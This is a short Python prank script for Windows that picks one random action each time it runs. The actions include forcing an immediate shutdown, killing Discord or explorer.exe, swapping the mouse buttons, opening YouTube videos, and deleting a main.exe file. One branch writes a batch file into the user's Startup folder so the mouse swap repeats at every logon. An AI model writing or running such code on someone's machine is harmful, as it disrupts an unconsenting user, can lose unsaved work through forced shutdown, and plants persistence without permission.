import os
import random


random_number = random.randint(0, 8)

# Get username of current user
username = os.getlogin()

# Get path to startup folder
startup_path = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
bat_path = startup_path + "\\prank.bat"

current_path = os.getcwd()

# Select path based on random number
if (random_number == 0):
    os.system("start firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ")

if (random_number == 1):
    os.system("taskkill /f /im discord.exe")

if (random_number == 2):
    os.system("rundll32.exe user32.dll, SwapMouseButton")
    
if (random_number == 3):
    os.system("shutdown /s /t 0")
    
if (random_number == 4):
    pass

if (random_number == 5):
    os.system("start firefox https://www.youtube.com/watch?v=9bZkp7q19f0")
    
if (random_number == 6):
    os.system(f'echo rundll32.exe user32.dll, SwapMouseButton > "{bat_path}"')

if (random_number == 7):
    os.system("taskkill /f /im explorer.exe")
    
if (random_number == 8):
    os.system(f"del {current_path}/main.exe")